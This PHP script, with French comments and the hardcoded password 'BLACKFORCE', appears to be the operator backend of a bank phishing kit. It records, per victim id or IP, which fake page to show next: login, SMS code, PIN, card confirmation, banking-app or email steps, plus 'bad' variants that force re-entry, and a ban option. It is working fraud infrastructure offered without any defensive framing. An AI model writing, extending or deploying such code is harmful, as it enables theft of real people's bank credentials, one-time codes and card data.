<?php
require_once "../../cors.php";

define('ACCESS_PWD',   'BLACKFORCE');
define('ACTIONS_FILE', './actions.json');

// ─── Helpers ──────────────────────────────────────────────────────────────────

function jsonResponse(int $code, array $payload): void
{
    http_response_code($code);
    header('Content-Type: application/json; charset=UTF-8');
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}

function sanitizeId(string $id): string
{
    if (filter_var($id, FILTER_VALIDATE_IP)) return $id;
    return preg_replace('/[^a-zA-Z0-9\-_.]/', '', $id);
}

function isValidStep(string $step): bool
{
    $allowed = [
        'login', 'badlogin',
        'sms', 'badsms',
        'pin', 'badpin',
        'confirm', 'badcard',
        'app',
        'mail', 'badmail',
        'custom', 'badcustom',
        'ban', 'unknown',
    ];
    return in_array($step, $allowed, true);
}

// ─── Validation requête ───────────────────────────────────────────────────────

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    jsonResponse(405, ['error' => 'Method not allowed.']);
}

foreach (['id', 'view', 'PWD'] as $param) {
    if (!isset($_GET[$param]) || $_GET[$param] === '') {
        jsonResponse(400, ['error' => "Paramètre manquant : {$param}"]);
    }
}

if ($_GET['PWD'] !== ACCESS_PWD) {
    jsonResponse(403, ['error' => 'Accès refusé.']);
}

// ─── Sanitize ─────────────────────────────────────────────────────────────────

$id   = sanitizeId(trim($_GET['id']));
$view = trim($_GET['view']);

if (empty($id)) {
    jsonResponse(400, ['error' => 'ID invalide.']);
}

if (!isValidStep($view)) {
    jsonResponse(400, ['error' => "Step invalide : {$view}"]);
}

// ─── Lecture fichier ──────────────────────────────────────────────────────────

if (file_exists(ACTIONS_FILE)) {
    $raw  = file_get_contents(ACTIONS_FILE);
    $data = json_decode($raw, true);
    if (!is_array($data) || !isset($data['actions'])) {
        $data = ['actions' => []];
    }
} else {
    $data = ['actions' => []];
}

// ─── Upsert step uniquement ───────────────────────────────────────────────────

$found = false;
foreach ($data['actions'] as &$action) {
    if (($action['id'] ?? null) === $id) {
        $action['step']       = $view;
        $action['updated_at'] = date('Y-m-d H:i:s');
        $found = true;
        break;
    }
}
unset($action);

if (!$found) {
    $data['actions'][] = [
        'id'         => $id,
        'step'       => $view,
        'text'       => '',
        'input'      => '',
        'created_at' => date('Y-m-d H:i:s'),
        'updated_at' => date('Y-m-d H:i:s'),
    ];
}

// ─── Écriture sécurisée ───────────────────────────────────────────────────────

$written = file_put_contents(
    ACTIONS_FILE,
    json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
    LOCK_EX
);

if ($written === false) {
    jsonResponse(500, ['error' => 'Échec écriture fichier.']);
}

jsonResponse(200, [
    'status'  => 'done',
    'id'      => $id,
    'step'    => $view,
    'created' => !$found,
]);